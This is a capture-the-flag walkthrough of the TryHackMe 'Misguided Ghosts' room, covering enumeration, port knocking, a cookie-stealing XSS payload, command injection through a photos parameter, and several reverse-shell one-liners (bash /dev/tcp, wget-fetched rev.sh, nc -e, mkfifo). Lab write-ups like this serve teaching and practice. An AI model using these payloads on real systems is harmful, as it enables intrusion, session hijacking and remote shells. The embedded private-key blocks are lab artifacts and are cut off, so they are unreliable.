<h1 align="center">Misguided Ghosts</h1>
<p align="center">2025, October 19  &nbsp; .  &nbsp; Hey! I´m <a href="https://www.linkedin.com/in/rosanafssantos/">Rosana</a>, and I’m excited to join you on this adventure on my <code>530</code>-day-streak in<a href="https://tryhackme.com"> TryHackMe</a>.<br>Collaboration between Jake and Blob! &nbsp;&nbsp;Access it <a href="https://tryhackme.com/room/misguidedghosts">here</a>.<br><br><img width="1200px" src="https://github.com/user-attachments/assets/8ff8b201-b9a3-4476-b2fe-ddea27e781de"></p>



<h2>Task 1 . Misguided Ghosts</h2>
<p>Deploy the machine and get root privileges</p>

<p><em>Answer the questions below</em></p>


<h1>Summary<a id='1'></a></h1>
<p>
  
- Network Enumeration: [Nmap](#1)<br>
- Service Enumeration: [FTP](#2)<br>
- Packet Analysis: [Wireshark](#3)<br>
- Traffic Signaling: [Port Knocking](#4), T1205.001<br>
- Static Host Mapping: [/etc/hosts](#5)<br>
- Active Scanning: Vulnerability Scanning, T1595.002 - [Nikto](#6)<br>
- Directory & File Enumeration: [Gobuster](#7)<br>
- Service Fingerprinting: [Certificate Inspection](#8)<br>
- [Web Content Discovery](#9)<br>
- [RCE](#10)<br>
- [Initial Foothold](#11)<br>
- [Shell as Zac](#12)<br>
- [Shell as Heyley](#13)<br>
- [Root](#14)</p>


<br>
<h1 align="center">Network Enumeration: Nmap<a id='1'></a></h1>
<p align="center">Identify <strong>2</strong> open ports</p>

<div align="center"><p>

| **Port**           | **Service**          | **Version**                     |
|-------------------:|:---------------------|:--------------------------------|
| `21`               |`FTP`                 |vsftpd 3.0.3                     |
| `22`               |`SSH`                 |OpenSSH 7.6p1 Ubuntu 4ubuntu0.3  |

</p></div><br>


```bash
:~/MisguidedGhosts# nmap -p- -T4 xx.xxx.xxx.xxx
...
PORT   STATE SERVICE
21/tcp open  ftp
22/tcp open  ssh
```

```bash
:~/MisguidedGhosts# nmap -sC -sV -sS -O -A -p21,22 xx.xxx.xxx.xxx
...
PORT   STATE SERVICE VERSION
21/tcp open  ftp     vsftpd 3.0.3
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
|_drwxr-xr-x    2 ftp      ftp          4096 Aug 28  2020 pub
| ftp-syst: 
|   STAT: 
| FTP server status:
|      Connected to ::ffff:xx.xxx.xx.xx
|      Logged in as ftp
|      TYPE: ASCII
|      No session bandwidth limit
|      Session timeout in seconds is 300
|      Control connection is plain text
|      Data connections will be plain text
|      At session startup, client count was 1
|      vsFTPd 3.0.3 - secure, fast, stable
|_End of status
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
...
```

<br>
<h1 align="center">Service Enumeration: FTP<a id='2'></a></h1>
<p align="center">Identify <strong>info.txt</strong>, <strong>jokes.txt</strong>, and <strong>trace.pcapng</strong></p>

```bash
:~/MisguidedGhosts# ftp xx.xxx.xxx.xxx
Connected to xx.xxx.xxx.xxx.
220 (vsFTPd 3.0.3)
Name (xx.xxx.xxx.xxx:......): anonymous
230 Login successful.
Remote system type is UNIX.
Using binary mode to transfer files.
ftp> ls -lah
200 PORT command successful. Consider using PASV.
150 Here comes the directory listing.
drwxr-xr-x    3 ftp      ftp          4096 Aug 18  2020 .
drwxr-xr-x    3 ftp      ftp          4096 Aug 18  2020 ..
drwxr-xr-x    2 ftp      ftp          4096 Aug 28  2020 pub
226 Directory send OK.
ftp> cd pub
250 Directory successfully changed.
ftp> ls -lah
200 PORT command successful. Consider using PASV.
150 Here comes the directory listing.
drwxr-xr-x    2 ftp      ftp          4096 Aug 28  2020 .
drwxr-xr-x    3 ftp      ftp          4096 Aug 18  2020 ..
-rw-r--r--    1 ftp      ftp           103 Aug 28  2020 info.txt
-rw-r--r--    1 ftp      ftp           248 Aug 26  2020 jokes.txt
-rw-r--r--    1 ftp      ftp        737512 Aug 18  2020 trace.pcapng
226 Directory send OK.
ftp> mget *
mget info.txt? y
200 PORT command successful. Consider using PASV.
150 Opening BINARY mode data connection for info.txt (103 bytes).
226 Transfer complete.
103 bytes received in 0.12 secs (0.8489 kB/s)
mget jokes.txt? y
200 PORT command successful. Consider using PASV.
150 Opening BINARY mode data connection for jokes.txt (248 bytes).
226 Transfer complete.
248 bytes received in 0.07 secs (3.2373 kB/s)
mget trace.pcapng? y
200 PORT command successful. Consider using PASV.
150 Opening BINARY mode data connection for trace.pcapng (737512 bytes).
226 Transfer complete.
737512 bytes received in 0.10 secs (6.9871 MB/s)
ftp> exit
221 Goodbye.
```

```bash
:~/MisguidedGhosts# ls
info.txt  jokes.txt  trace.pcapng
```

<br>
<p align="center">Identify <strong>Paramore</strong> by inspecting <strong>info.txt</strong></p>

```bash
:~/MisguidedGhosts# file info.txt
info.txt: ASCII text
```

```bash
:~# cat info.txt
I have included all the network info you requested, along with some of my favourite jokes.

- Paramore
```

<br>
<p align="center">Identify Taylor, Josh, and <strong>knock</strong> by inspecting <strong>jokes.txt</strong></p>

```bash
~/MisguidedGhosts# file jokes.txt
jokes.txt: ASCII text
```

```bash
:~# cat jokes.txt
Taylor: Knock, knock.
Josh:   Who's there?
Taylor: The interrupting cow.
Josh:   The interrupting cow--
Taylor: Moo

Josh:   Knock, knock.
Taylor: Who's there?
Josh:   Adore.
Taylor: Adore who?
Josh:   Adore is between you and I so please open up!
```

<br>
<h1 align="center">Packet Analysis: Wireshark<a id='3'></a></h1>
<p align="center">Identify ports to knock by inspecting <strong>trace.pcapng</strong></p>

```bash
:~/MisguidedGhosts# file trace.pcapng
trace.pcapng: pcapng capture file - version 1.0
```

<br>
<p align="center">Identify the traffic involving <strong>192.168.236.128</strong> by navigating to <strong>Statistics</strong>  &nbsp; ➜  &nbsp; <strong>Conversations</strong>  &nbsp; ➜  &nbsp; <strong>IPV4</strong> in Wireshark.</p>

<img width="1242" height="153" alt="image" src="https://github.com/user-attachments/assets/0d20f7df-f49c-4def-b058-d987f5b50ee6" />

<br>
<br>
<br>
<p align="center">Identify the source ports <code>7864</code>, <code>8273</code>, <code>9241</code>, <code>12007</code>, and <code>60753</code> in Wireshark.<br>Apply the display filter <strong>ip.src == 192.168.236.131</strong> and press ENTER. Righ-click any filtered packet, expand the <strong>Transmission Control Protocol</strong> (TCP) section, then right-click over <strong>Destination Port</strong> and <strong>Source Port</strong> fields and select <strong>Apply as a Column</strong> for each.</p>

<img width="1245" height="183" alt="image" src="https://github.com/user-attachments/assets/f4799769-dca5-4925-a871-6de1d8c39c14" />

<br>
<br>
<br>
<p align="center">Identify <strong>872</strong> packets of 1,420 lenght sent to <strong>192.168.236.131</strong> from <strong>35.246.6.109</strong>, <strong>5</strong> ARP packets requesting, and <strong>Info</strong> containing <strong>Who has 192.168.236.131? Tell 192.168.236.128</strong> with the respectives responses.</p>

<img width="1246" height="190" alt="image" src="https://github.com/user-attachments/assets/cd0b9862-a5ba-4bc6-88ca-f3920d087140" />

<br>

<img width="1256" height="282" alt="image" src="https://github.com/user-attachments/assets/2588e3b3-6c80-4529-8448-25c6fad40a70" />

<br>
<br>
<br>
<p align="center">Identify <strong>18</strong> DNS interactions between <strong>192.168.236.128</strong> and <strong>192.168.236.2</strong>, <strong>www.jake-ruston.com</strong>, AAAA Name: <strong>boblolaw321.wixsite.com</strong>, CNAME Name: <strong>username.wix.com</strong>, Authoritave nameserver: <strong>wix.com</strong>, Primary name server: <strong>ns1.p14.dynect.net</strong>, Responsible authority´s mailbox: <strong>admin.wix.com</strong> by following the UDP stream.</p>

<img width="928" height="98" alt="image" src="https://github.com/user-attachments/assets/a2eaafdb-c12f-40b0-9f31-bf9eb94d993b" />

<br>

<img width="927" height="106" alt="image" src="https://github.com/user-attachments/assets/3ddd3338-98ce-4adb-b096-cf84d3f216f9" />

<br>
<br>
<h1 align="center">Traffic Signaling: Port Knocking, T1205.001<a id='6'></a></h1>
<p align="center"><strong>Knock</strong> on ports <code>7864</code>, <code>8273</code>, <code>9241</code>, <code>12007</code>, and <code>60753</code> ports by executing a script such as <strong>knockports.sh</strong></p>

```bash
#!/bin/bash

telnet $1 7864
telnet $1 8273
telnet $1 9241
telnet $1 12007
telnet $1 60753
```

```bash
:~/MisguidedGhosts# ./knockports.sh xx.xxx.xxx.xxx
Trying xx.xxx.xxx.xxx...
telnet: Unable to connect to remote host: Connection refused
Trying xx.xxx.xxx.xxx...
telnet: Unable to connect to remote host: Connection refused
Trying xx.xxx.xxx.xxx...
telnet: Unable to connect to remote host: Connection refused
Trying xx.xxx.xxx.xxx...
telnet: Unable to connect to remote host: Connection refused
Trying xx.xxx.xxx.xxx...
telnet: Unable to connect to remote host: Connection refused
```

<p align="center">Identify <strong>3</strong> ports open by enumerating the network.</p>

<div align="center"><p>

| **Port**           | **Service**          | **Version**                     |
|-------------------:|:---------------------|:--------------------------------|
| `21`               |`FTP`                 |vsftpd 3.0.3                     |
| `22`               |`SSH`                 |OpenSSH 7.6p1 Ubuntu 4ubuntu0.3  |
| `8080`             |`SSL/HTTP`            |Werkzeug httpd 1.0.1             |

</p></div><br>


```bash
:~/MisguidedGhosts# nmap -p- -T4 xx.xxx.xxx.xxx
...
PORT     STATE SERVICE
21/tcp   open  ftp
22/tcp   open  ssh
8080/tcp open  http-proxy
```

```bash
:~/MisguidedGhosts# nmap -sC -sV -Pn -p21,22,8080 xx.xxx.xxx.xxx
...
PORT     STATE SERVICE  VERSION
21/tcp   open  ftp      vsftpd 3.0.3
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
|_drwxr-xr-x    2 ftp      ftp          4096 Aug 28  2020 pub
| ftp-syst: 
|   STAT: 
| FTP server status:
|      Connected to ::ffff:xx.xxx.xx.xx
|      Logged in as ftp
|      TYPE: ASCII
|      No session bandwidth limit
|      Session timeout in seconds is 300
|      Control connection is plain text
|      Data connections will be plain text
|      At session startup, client count was 4
|      vsFTPd 3.0.3 - secure, fast, stable
|_End of status
22/tcp   open  ssh      OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
...
8080/tcp open  ssl/http Werkzeug httpd 1.0.1 (Python 2.7.18)
|_http-server-header: Werkzeug/1.0.1 Python/2.7.18
|_http-title: Misguided Ghosts
| ssl-cert: Subject: commonName=misguided_ghosts.thm/organizationName=Misguided Ghosts/stateOrProvinceName=Williamson Country/countryName=TN
| Not valid before: 2020-08-11Txx:xx:xx
|_Not valid after:  2021-08-11Txx:xx:xx
```

<br>
<h1 align="center">Static Host Mapping: /etc/hosts<a id='5'></a></h1>

```bash
xx.xxx.xxx.xxx misguided_ghosts.thm
```

<br>
<h1 align="center">Active Scanning: Vulnerability Scanning, T1595.002 - Nikto<a id='6'></a></h1>
<p align="center">Execute <strong>Nikto</strong> to identify potentially exposed endpoints such as <code>/console</code> and to enumerate HTTP supported methods: methods  <code>HEAD</code>, <code>OPTIONS</code>, and <code>GET</code>.</p>

```bash
:~# nikto -h https://misguided_ghosts.thm:8080
- Nikto v2.1.5
---------------------------------------------------------------------------
+ Target IP:          xx.xxx.xxx.xxx
+ Target Hostname:    misguided_ghosts.thm
+ Target Port:        8080
---------------------------------------------------------------------------
+ SSL Info:        Subject: /C=TN/ST=Williamson Country/L=Franklin/O=Misguided Ghosts/CN=misguided_ghosts.thm/emailAddress=zac@misguided_ghosts.thm
                   Ciphers: TLS_AES_256_GCM_SHA384
                   Issuer:  /C=TN/ST=Williamson Country/L=Franklin/O=Misguided Ghosts/CN=misguided_ghosts.thm/emailAddress=zac@misguided_ghosts.thm
+ Start Time:         2025-10-19 xx:xx:xx (GMT1)
---------------------------------------------------------------------------
+ Server: Werkzeug/1.0.1 Python/2.7.18
+ The anti-clickjacking X-Frame-Options header is not present.
+ No CGI Directories found (use '-C all' to force check all possible dirs)
+ Hostname 'misguided_ghosts.thm' does not match certificate's CN 'misguided_ghosts.thm/emailAddress=zac@misguided_ghosts.thm'
+ Allowed HTTP Methods: HEAD, OPTIONS, GET 
+ OSVDB-3092: /console: This might be interesting...
+ 6544 items checked: 13 error(s) and 4 item(s) reported on remote host
+ End Time:           2025-10-19 xx:xx:xx (GMT1) (76 seconds)
---------------------------------------------------------------------------
+ 1 host(s) tested
```

<br>
<h1 align="center">Directory & File Enumeration<a id='7'></a></h1>
<p align="center">Identify <code>/login</code>, <code>/dashboard</code>, and <code>/console</code>.</p>

```bash
:~/MisguidedGhosts# gobuster dir -u https://misguided_ghosts.thm:8080/ -w /usr/share/wordlists/SecLists/Discovery/Web-Content/directory-list-2.3-medium.txt -e -k -q
https://misguided_ghosts.thm:8080/login                (Status: 200) [Size: 761]
https://misguided_ghosts.thm:8080/dashboard            (Status: 302) [Size: 219] [--> https://misguided_ghosts.thm:8080/login]
https://misguided_ghosts.thm:8080/console              (Status: 200) [Size: 1985]
```

<br>
<h1 align="center">Service Fingerprinting: Certificate Inspection<a id='8'></a></h1>
<p align="center">Navigate to misguided_ghosts.thm:8080 to inspect its <strong>Certificate</strong>.<br>It complements what <strong>Nikto</strong> revealed.Subject Name: Organization: Misguided Ghosts<br>Country: TN, State/Province: Williamson Country, Locality: Franklin, Common Name: misguided_ghosts.thm, Email Address: zac@misguided_ghosts.thm,Miscellaneous: Signatures Algorithm: SHA-256 RSA Encryption, Version: 3. Take note <strong>E</strong> = <strong>zac@misguided_ghosts.thm</strong>!</p>

<img width="1260" height="473" alt="image" src="https://github.com/user-attachments/assets/d3064975-0214-497e-81e8-715197b0c03f" />

<br>
<br>
<h1 align="center">Web Content Discovery<a id='9'></a></h1>
<p align="center">Navigate to misguided_ghosts.thm:8080. View source code.<br>Identify <code>hayley</code>, and a reference to <code>/static/css/materialize.min.css</code>.</p>

<img width="1277" height="533" alt="image" src="https://github.com/user-attachments/assets/1e3a5b49-e428-4835-b6d4-d2f19272319a" />

<img width="1280" height="420" alt="image" src="https://github.com/user-attachments/assets/d05386cb-5bff-4001-8f1e-914f37a32dcd" />

<br>
<br>
<p align="center">Navigate to <code>/static/css/materialize.min.css</code>.</p>

<img width="1284" height="423" alt="image" src="https://github.com/user-attachments/assets/07deace4-4aff-4a50-836f-89e5423eae75" />

<br>
<br>
<p align="center"<a https://codebeautify.org/css-beautify-minify"> Beautify</a> <code>/static/css/materialize.min.css</code>. Look for clues and embedded comments.</p>

<img width="1875" height="712" alt="image" src="https://github.com/user-attachments/assets/60f4fbc0-3c07-4b08-8682-cde331559c9f" />

<br>
<br>
<p align="center">Navigate to misguided_ghosts.thm:8080<code>/dashboard</code>. Observe redirect to <code>/login</code>. View source code.<br>Log in <strong>zac</strong> : <strong>zac</strong>. Test input fields with <strong>script</strong> payloads.</p>

<img width="1271" height="387" alt="image" src="https://github.com/user-attachments/assets/4c0929c0-2df8-4944-81c1-f848e090b4a9" />

<br>
<br>

<img width="1265" height="377" alt="image" src="https://github.com/user-attachments/assets/c9a1618b-618c-478c-a7ca-da4d7be646c1" />

<br>
<br>

<img width="1279" height="425" alt="image" src="https://github.com/user-attachments/assets/2aa1896c-8359-448b-aae4-21ec63e3fef3" />

<br>
<br>
<p align="center">Navigate to misguided_ghosts.thm:8080<code>/console</code>. Discover <strong>SECRET</strong> viewing source code.</p>

<img width="1276" height="363" alt="image" src="https://github.com/user-attachments/assets/6a287b84-e63c-48b4-81de-83da31f261cd" />

<br>
<br>
<img width="1292" height="666" alt="image" src="https://github.com/user-attachments/assets/bc150b9e-2ac9-448f-a0cf-24a1e12be9aa" />

<br>
<br>
<p align="center">Go back to misguided_ghosts.thm:8080<code>/dashboard</code>.<br>Use <strong>To HTML Entity</strong> encoding to craft a payload.<br>Set up an HTTP server. Add the payload to both fields. Identify <strong>XSS</strong><br>Use the payload in sequence. Observe /login/[cookie <strong>Value</strong>].</p>

```bash
<sscriptcript>    
```

```bash
&lt;sscriptcript&gt;
```

<br>
<br>

```bash
</sscriptcript>
```

```bash
&lt;&sol;sscriptcript&gt;
```

<br>
<br>

```bash
</sscriptcript>   </sscriptcript>
```

```bash
&lt;&sol;sscriptcript&gt;   &lt;&sol;sscriptcript&gt;
```

<br>
<br>

<p align="center">Payload A</p>

```bash
&lt;sscriptcript&gt;alert('Hello')&lt;/sscriptscript&gt;
```

<br>
<br>

<p align="center">Payload B</p>

```bash
&lt;&sol;sscriptcript&gt;var i = new Image();i.src="http://xx.xxx.xxx.xxx:8000/"+document.cookie;&lt;&sol;sscriptcript&gt;
```

<br>
<br>

```bash
:~# python3 -m http.server
Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...
xx.xxx.xxx.xx - - [15/Sep/2025 xx:xx:xx] code 404, message File not found
xx.xxx.xxx.xx - - [15/Sep/2025 xx:xx:xx] "GET /login=hayley_is_admin HTTP/1.1" 404 -
```

<img width="842" height="115" alt="image" src="https://github.com/user-attachments/assets/92b863ff-40be-4974-92ea-bbdb1e67fa59" />

<br>
<br>
<p align="center">Substitute the current cookie <strong>Value</strong> by the one just uncovered. Refresh. Click <code>/dashboard</code>.</p>

<img width="1040" height="112" alt="image" src="https://github.com/user-attachments/assets/99193bee-7f4b-45b6-ba17-0479e0f7c504" />

<br>
<br>

<img width="1139" height="467" alt="image" src="https://github.com/user-attachments/assets/29f99e7e-67aa-4bb8-9a74-97486c673072" />

<br>
<br>
<p align="center">Enumerate. Identify <code>/photos</code>.</p>

```bash
:~/MisguidedGhosts# gobuster dir -u https://misguided_ghosts.thm:8080/ -w /usr/share/wordlists/SecLists/Discovery/Web-Content/directory-list-2.3-medium.txt -e -q -c 'login=hayley_is_admin' -k 2>/dev/null  
https://misguided_ghosts.thm:8080/login                (Status: 302) [Size: 227] [--> https://misguided_ghosts.thm:8080/dashboard]
https://misguided_ghosts.thm:8080/photos               (Status: 200) [Size: 629]
https://misguided_ghosts.thm:8080/dashboard            (Status: 200) [Size: 815]
https://misguided_ghosts.thm:8080/console              (Status: 200) [Size: 1985]
```

<br>
<p align="center">Navigate to <code>/photos</code></p>

<img width="1275" height="321" alt="image" src="https://github.com/user-attachments/assets/1dc5437d-1e09-433b-8d70-23e27e2d179a" />

<br>
<br>
<br>
<h1 align="center">RCE<a id='10'></a></h1>
<p align="center">Try id, whoami, ... . No success.<br>Try <code>?image=.</code> Success. <strong>RCE</strong>.</p>

<img width="1279" height="509" alt="image" src="https://github.com/user-attachments/assets/2e9a9b0f-23e8-4569-9afd-3f962172dc56" />

<br>
<br>
<br>
<p align="center">Try <code>?image=.;id</code></p>

<img width="1281" height="466" alt="image" src="https://github.com/user-attachments/assets/4f8bc41a-4468-4561-bc47-5f9f8a43ca87" />

<br>
<br>
<p align="center">Try <code>?image=.;whoami</code>. Identify <strong>root</strong>.</p>

<img width="1272" height="467" alt="image" src="https://github.com/user-attachments/assets/039bcfef-f80b-46fd-8003-b8dcfa4a7f4f" />

<br>
<br>
<p align="center">Try <code>?image=.;pwd</code>. Identify <strong>app</strong>.</p>

<img width="1271" height="456" alt="image" src="https://github.com/user-attachments/assets/75f07703-09a7-42f7-89b1-3abb3e1ec086" />

<br>
<br>
<p align="center">Try <code>?image=.;hostname</code>. Identify <strong>6691d525d07b</strong>.</p>

<img width="1277" height="462" alt="image" src="https://github.com/user-attachments/assets/8841e8b0-3394-424d-9588-fdef96eafd3c" />

<br>
<br>
<p align="center">Craft a payload like <strong>rev.sh</strong>. Set up an HTTP server. Set up a listener. Navigate to the two paths below. Get the shell.</p>

<br>
<br>
<h6 align="center">rev.sh</h6>

```bash
:~/MisguidedGhosts# nano rev.sh
```

```bash
bash -i >& /dev/tcp/xx.xxx.xx.xx/9001 0>&1
```

<h6 align="center">path 1</h6>

```bash
https://misguided_ghosts.thm:8080/photos?image=/etc/passwd;CMD=$'\x20wget\x20xx.xx.xxx.xx.xx:8000/rev.sh';`$CMD`
```

<h6 align="center">HTTP server</h6>

```bash
:~/MisguidedGhosts# python3 -m http.server
Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...
xx.xxx.xxx.xxx- - [19/Oct/2025 xx:xx:xx] "GET /rev.sh HTTP/1.1" 200 -
```

<h6 align="center">Listener</h6>

```bash
:~/MisguidedGhosts# nc -nlvp 9001
Listening on 0.0.0.0 9001
```

<h6 align="center">path 2</h6>

```bash
https://misguided_ghosts.thm:8080/photos?image=/etc/passwd;CMD=$'rev.sh';`$CMD`
```

<br>
<p align="center">Observe <code>rev.sh</code>.</p>

<img width="1277" height="487" alt="image" src="https://github.com/user-attachments/assets/43bb20be-f2c1-4213-9134-f0609b574f54" />

<br>
<br>
<p align="center">Practice also intercepting the traffic with <strong>Burp Suite</strong>, sending a GET request, and getting the shell.</p>

```bash
GET /photos?image=.;nc${IFS}xx.xxx.xx.xx{IFS}9001${IFS}-e${IFS}/bin/sh HTTP/1.1
Host: xx.xxx.xxx.xx:8080
Cookie: login=hayley_is_admin
User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:131.0) Gecko/20100101 Firefox/131.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/png,image/svg+xml,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Upgrade-Insecure-Requests: 1
Sec-Fetch-Dest: document
Sec-Fetch-Mode: navigate
Sec-Fetch-Site: none
Sec-Fetch-User: ?1
Priority: u=0, i
Te: trailers
Connection: keep-alive
```

<br>
<br>
<p align="center">Practice also using <strong>curl</strong>.</p>

```bash
$ curl -s -k -b 'login=hayley_is_admin' 'https://misguided_ghosts.thm:8080/photos?image=.;nc${IFS}xx.xxx.xx.xx{IFS}9001${IFS}-e${IFS}/bin/sh'
```

```bash
$ curl -s -k -b 'login=hayley_is_admin' 'https://misguided_ghosts.thm:8080/photos?image=rm${IFS}/tmp/f;mkfifo${IFS}/tmp/f;cat${IFS}/tmp/f|/bin/sh${IFS}-i|nc${IFS}xx.xxx.xx.xx${IFS}9001>/tmp/f'
```

<br>
<br>
<h1 align="center">Initial Foothold<a id='11'></a></h1>

```bash
:~# nc -nlvp 9001
Listening on 0.0.0.0 9001
Connection received on xx.xxx.xxx.xx 42125
id
uid=0(root) gid=0(root) groups=0(root),1(bin),2(daemon),3(sys),4(adm),6(disk),10(wheel),11(floppy),20(dialout),26(tape),27(video)
```

<br>
<p align="center">Note that there´s no Python available.</p>

```bash
which python3
```

<br>
<br>

```bash
pwd
/var/www/https
```

<br>
<p align="center">Note <strong>Dockerfile</strong> and <strong>start.sh</strong>.</p>

```bash
ls
Dockerfile
app.py
cert.pem
key.pem
requirements.txt
start.sh
static
stop.sh
templates
```

```bash
cd /home/zac
```

```bash
ls -lah
total 12K    
drwxr-xr-x    3 root     root        4.0K Sep 15 00:58 .
drwxr-xr-x    1 root     root        4.0K Sep 15 00:58 ..
drwxrwxr-x    2 1001     1001        4.0K Aug 26  2020 notes
```

```bash
cd notes
```

```bash
ls -lah
total 16K    
drwxrwxr-x    2 1001     1001        4.0K Aug 26  2020 .
drwxr-xr-x    3 root     root        4.0K Sep 15 00:58 ..
-rw-r--r--    1 1001     1002        1.6K Aug 25  2020 .id_rsa
-rw-r--r--    1 1001     1002         270 Aug 25  2020 .secret
```

<br>
<p align="center">Observe that Paramore wrote <strong>I ciphered it</strong>, and <strong>I know you remember how to get the key</strong>. Zac knows it.</p>

```bash
cat .secret
Zac,

I know you can never remember your password, so I left your private key here so you don't have to use a password. I ciphered it in case we suffer another hack, but I know you remember how to get the key to the cipher if you can't remember that either.

- Paramore
```

```bash
cat .id_rsa
-----BEGIN RSA PRIVATE KEY-----
NCBXsnNMYBEVTUVFawb9f8f0vbwLpvf0hfa1PYy0C91sYIG/U5Ss15fDbm2HmHdS
CgGHOkqGhIucEqe4mrcwZRY3ooKX2uB8IxJ6Ke9wM6g8jOayHFw2/UPWnveLxUQq
0Z/g9X5zJjaHfPI62OKyOFPEx7Mm0mfB5yRIzdi0NEaMmxR6cFGZuBaTOgMWRIk6
aJSO7oocDBsVbpuDED7SzviXvqTHYk/ToE9Rg/kV2sIpt7Q0D0lZNhz7zTo79IP0
TwAa61/L7ctOVRwU8nmYFoc45M0kgs5az0liJloOopJ5N3iFPHScyG0lgJYOmeiW
QQ8XJJqqB6LwRVE7hgGW7hvNM5TJh4Ee6M3wKRCWTURGLmJVTXu1vmLXz1gOrxKG
a60TrsfLpVu6zfWEtNGEwC4Q4rov7IZjeUCQK9p+4Gaegchy1m5RIuS3na45BkZL
4kv5qHsUU17xfAbpec90T66Iq8sSM0Je8SiivQFyltwc07t99BrVLe9xLjaETX/o
DIk3GCMBNDui5YhP0E66zyovPfeWLweUWZTYJpRsyPoavtSXMqKJ3M4uK00omAEY
cXcpQ+UtMusDiU6CvBfNFdlgq8Rmu0IU9Uvu+jBBEgxHovMr+0MNMcrnYmGtTVHe
gYUVd7lraZupxArh1WHS8llbj9jgQ5LhyAiGrx6vUukyFZ8IDTjA5BmmoBHPvmbj
mwRx+RJNeZYT3Pl/1Qe8Uc4IAim3Y7yzMMfoZodw/g2G2qx4sNjYLJ8Mry6RJ8Fq
wf2ES1WOyNOHjQ2iZ1JrXfJnEc/hU1J3ZLhY7p6oO+DAd7m5HomDik/vUTXlS3u1
A1Pr4XRZW0RYggysRmUTqVEiuTIMY4Y0LhIbY/Vo8pg6OTyKL0+ktaCDaRXEnZBp
VU1ABBWoGPfXgUpEOsvgafreUVHnyeYru8n4L8WB/V7xUk56mcU6pobmD3g19T6n
ddocO8sVX6W8mhPVllsc6l+Xl4enJUmReXmXaiPiHoch1oaCgrYYmsONThM7QUut
oOIGdb6O/3qfZA+V+EIm3tP+3U/+RsurKmrpVIFWzRIRuj90aBhOzNBsAHloOlOB
LCuVjI5M6VuXJ+YY9M9biS2qafFUgIUaKYMVdzDtJFkMhACpJqpy+w6owW0hn3vA
H6gpsbnl3zm3ey0JMqnDbwWqKFWTU6DK8V5o6whXZJRXJb1Lxs38PiAry9TPRGVA
M5EY0XxjniOoesweDGHryeJNeZV9iRP/CAV0LGDx7FAtl3a7p3DGb2qz0FL6Dyys
vgh73EndW0xa6N8clLyA1/GR5x54h+ayGzMQa8d4ZdAhWl+CZMpTjqEEYKRL9/Xc
eXU3MNVuPeDrqdjYGg+4xXtSaLwSbOmGwH/aED2j4xxgraMo3Bp+raHGmOEex/RL
1nCbZKDUkUP3Cv8mc9AAVs8UN6O6/nZo1pISgJyPjuUyz7S/paSz04x7DjY80Ema
r8WpMKfgl3+jWta+es1oL6DtD9y7RD5u9RPSXGNt/3QwNu+xNlle39laa8UZayPI
VhBUH4wvFSmt0puRjBgE6Y5smOxoId18IFKZL1mko1Y68nLNMJsj
-----END RSA PRIVATE KEY-----
```

<br>
<p align="center">Use <strong>CyberChef</strong> with the recipe Vignère, and specific key. Save it after updating header and footer. And the key?</p>

```bash
-----BEGIN RSA PRIVATE KEY-----
MIIEowIBAAKCAQEApya9l8m0cxfGexe0nmh1LHt0R91uXON/B5Ob15aSdl2NtOzB
XvIGUrxCqDjeDwl4tnlrOTX3uvRT2dW8XzI6Ql9dI6p8eDcxNMd2/QYRcxdReBMz
0U/v9Z5yPqhDoKX62QJeVMLNs7Bo0llI5fNRusk0MKhTigM6rHFFbIwCJvOVXPr6
wSND7qniKIoEwewCKK7ZvedMxpZOFg/CjT9Tf/qC2zEyo7F0F0kFUov7iOd79KO0
ZdHw61/U7xiQUXdB8jvTUqb45S0rno5ju0akIrvVkyE5C3kEVOZyhB0aiIEVtarR
FS8WPQxmK6GlTUK7onCF7ckPL5ZQo4An6H3lMQIDAQABAoIBAEq1ehAZy1mVytTB
p60VqymSlEp6ohVKaUCNrR4S4quc7PVszJEPQ9w+4Nwnbrjx1s5YPqB3ip45DjFS
4rr5zChWT17dmHxyzr90V66Hw8zZI0Sz8HkhbXMuuole07s99HyCHn9sAlzKAE/k
MDz3IBSIUZdd5NjO0K66gfkeKugVRdlQFUIAIvYzuYjpxsYETmTE3B4wJ00utHAH
xMeoW+BaIdnSkT6IcIbWAsnfw8Ytq0RP9Jxt+pIIApsWquSy+0TJVxgpXsNaPECt
iXACk7havOwodHyd1FCH8nkhq9qcZ5GwaZoNyt6ePjmxLG8PZCeP5DlsvIDYqbdi
sdYt+AECgYEA3Wh/1Zz8Je4HGpt3U7huBOeuGvzf/b2V2sw4yUqUUE8Btx6XQ8Mm
fa2TU1VUfUKQeF2kY1PyEbSiTe/gA1Q3GHqT7e6qN+JHk7i5QjbFhq/cBPGgH3w1
Z1Vy4ENIR0GAfmfzNvPIsUKpbPRHN4A0KnPiU/Ej8ei6NZfRH0+topECgYEAwUQr
UA1HIXFjVReDnBlNJhxfgmyaDQWpxkFyq8w4G8LD/U7dBr56ilP6eqasK3n19P6w
ysqbU8zCT6F8hwRUrszy6u+Sa4gmPBtNnSbZzoWpDxxw1qzInyUHhhQMZoT7MDpi
qNONkx6X/3luBZ+B+LPi3cK+3J/+TrayRiakKKECgYEApy90cAnVgJKnPJkuVsKK
GRwUpP5T6RdSY+AX9S9ipO2zvuHTmPBwTTBXcfKaFOfBjZIwQmyt+l6qvC0ou3rJ
C6vrrhus3vv3zn0LLwuKxfRfMECAB6ZT8Q5d6ygDGQNGEq1Nwy38WpWat9IRQMCH
I5NT0MzitpVknnlgCMOyunECgYB9pYL/LVK0NFJe7MWcg3p7r3CMi2xv0OG6Saxy
cnd73NisY0wg6U8jhUtP1/IQ5d54o+huPuBSz8j4GkWqRa+EYSwAfzZTAJXS9/Ey
nSJ3OMBbWaMmffiENn+4tGoHcKcZiKvBlJ/zKK2q4tgbgcLu3Iw+njCVoNKle/NU
1iRdYQKBgDK3Rx8li9HHRb8PC6Q6/mFv1wEBbYaOpbBui7N/ecRf04e7KfH80Zbc
q8CwTGoba3+lVzh+lo1xG6SvC9e7YK5q9AKHZFTa/3XsWp+mPkrl39swj8POcxVP
